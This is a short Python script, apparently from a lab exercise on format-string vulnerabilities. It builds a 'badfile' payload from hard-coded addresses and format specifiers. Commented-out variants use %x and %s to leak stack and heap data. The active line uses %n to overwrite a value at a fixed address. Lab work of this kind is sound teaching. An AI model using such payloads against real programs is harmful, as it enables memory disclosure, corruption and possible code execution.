#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0xbfffeeee
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
# s = "%.8x"*12 + "%n"

# Task 2.A: Stack Data
# s = "\xaa\xaa\xaa\xaa" + "%x " * 70 + "\n"

# Task 2.B: Heap Data
# The secret message's address:  0x080b4008
# s = "\x08\x40\x0b\x08" + "%x " * 63 + "%s\n"

# Task 3.A: Change the value to a different value
# s = "\x68\x50\x0e\x08" + "%x" * 63  + "%n\n"

# Task 3.B: Change the value to 0x5000
s = "\x68\x50\x0e\x08" + "%325x" * 63  + "a%n\n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
